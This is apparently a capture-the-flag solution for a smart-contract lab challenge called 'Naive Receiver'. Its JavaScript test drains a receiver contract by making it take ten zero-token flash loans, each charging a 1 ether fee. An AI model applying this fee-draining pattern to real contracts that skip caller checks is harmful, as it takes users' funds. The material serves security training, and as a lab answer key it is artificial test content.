# 2 - Naive Receiver

### Scripted Solution

```javascript
it('Exploit', async function () {
  // Borrow 0 tokens to receiver 10 times (1 ether fee each time)
  await this.pool.flashLoan(this.receiver.address, 0)
  await this.pool.flashLoan(this.receiver.address, 0)
  await this.pool.flashLoan(this.receiver.address, 0)
  await this.pool.flashLoan(this.receiver.address, 0)
  await this.pool.flashLoan(this.receiver.address, 0)
  await this.pool.flashLoan(this.receiver.address, 0)
  await this.pool.flashLoan(this.receiver.address, 0)
  await this.pool.flashLoan(this.receiver.address, 0)
  await this.pool.flashLoan(this.receiver.address, 0)
  await this.pool.flashLoan(this.receiver.address, 0)
})
```
